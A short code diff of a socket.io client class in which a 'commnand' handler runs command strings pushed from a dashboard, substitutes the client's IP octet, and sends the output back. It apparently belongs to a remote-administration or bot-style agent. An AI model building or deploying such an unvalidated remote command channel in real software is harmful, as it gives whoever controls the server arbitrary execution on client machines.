@@ -67,15 +67,16 @@ class Client implements iClient {
         result
       );
     });
-    socket.on("commnand", async (dashboardID, data) => {
-      console.log(data);
-      const result = await commandRun(data);
+    socket.on("commnand", async (dashboardID, command) => {
+      const clientID = ip.address().split(".")[3];
+      const splitedCommand = command.replace("%ip", clientID);
+      const resultCommand = await commandRun(splitedCommand);
       socket.emit(
         "client_logEvent",
         dashboardID,
         ip.address(),
         socket.id,
-        result
+        resultCommand
       );
     });
     socket.on("filedown", async (dashboardID, data) => {
